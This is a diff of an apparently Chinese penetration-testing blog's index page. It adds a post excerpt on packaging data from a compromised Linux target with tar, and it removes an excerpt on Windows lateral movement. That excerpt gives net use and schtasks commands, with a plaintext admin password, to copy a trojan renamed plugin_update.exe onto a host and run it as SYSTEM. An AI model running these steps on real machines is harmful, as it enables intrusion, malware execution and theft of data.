@@ -157,6 +157,40 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/04/24/tar-file/">
+                利用目标系统现有工具快速打包目标机器数据
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-24</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/tar-file/">tar file</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控,但,具体怎么监控呢[好吧,那又是个非常大的话题,个人能力现在实在有限],无非就是下些各种各样的资料回来[当然,这可能是所有监控里面最朴实无华的一种],今天,我们单就这一点来做些简要说明,事先声明,可以写脚本[有时候确实不太灵活],但大多数脚本的核心可能还是靠这些东西,废话就先到这儿吧,希望下面的内容能帮到你,写的不好,管用就行</p>
+<p>0x02 在linux机器下的快速打包方式[下面这些工具一般在目标机器上都会自带]:</p>
+<p>利用 <code>tar</code>,一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例,只是打包个数据而已,哪个好用用哪个就行了,没必要在这些问题上过于纠结[我们并不是在研究压缩算法]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">--exclude 排除不打包的文件</div><div class="line">-c 创建文件</div><div class="line">-v 显示打包过程</div><div class="line">-f 指定要打包的文件</div><div class="line">-z 压缩</div><div class="line">-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了</div><div class="line">-C 解压到指定目录中</div><div class="line">-p 打包的时候保持原有文件属性</div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/04/24/tar-file/" class="read-more">Read More</a>
+    
+
+</div>
+
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/04/24/SquirrelMail-RCE/">
                 SquirrelMail < 1.4.23 RCE [CVE-2017-7692]
             </a>
@@ -609,39 +643,6 @@
 <p>0x02 首先,假设我们已经获取了目标系统的一个meterpreter会话,然后,我们发现在该目标机器上存在内网段,此时,我们想继续对目标该内网进行渗透,然后就有了下面的一些内容<br><img src="/img/ipconfig meter.jpg" alt=""><br>
         </div>
         <a href="/2016/09/25/msf-socks4a/" class="read-more">Read More</a>
-    
-
-</div>
-
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/24/ipc-reverse-shell/">
-                win内网中利用ipc弹shell 小记
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/ipc-note/">ipc note</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 首先,想办法把马拷到目标机器上再说:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># net use <span class="symbol">\\</span>192.168.3.168<span class="symbol">\i</span>pc$ /user:administrator "admin!@#45"</div><div class="line"># copy shell.exe <span class="symbol">\\</span>192.168.3.168<span class="symbol">\c</span>$<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\p</span>lugin_update.exe</div></pre></td></tr></table></figure></p>
-<p>0x02 利用最常规的copy[xcopy] &amp; schtasks(按说ipc建立以后,schtasks就不用带账号密码了,尤其我这里还是以system权限运行[本身就不需要账号密码],但实际测试中不带就拒绝访问,至于具体原因,暂未知,保险起见还是带上):<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># schtasks /create /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /<span class="keyword">tr</span> <span class="keyword">c</span>:\windows\temp\plugin_update.<span class="keyword">exe</span> /sc once /<span class="keyword">st</span> <span class="number">10</span>:<span class="number">29</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /RU System  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span> </div><div class="line"># schtasks /run /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span>  /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span>  你也可以不用等,让目标立即运行任务</div><div class="line"># schtasks /F /<span class="keyword">delete</span> /<span class="keyword">tn</span> <span class="string">"plugin_update"</span> /S <span class="number">192.168</span>.<span class="number">3.168</span> /<span class="keyword">u</span> administrator /<span class="keyword">p</span> <span class="string">"admin!@#45"</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/24/ipc-reverse-shell/" class="read-more">Read More</a>
     
 
 </div>
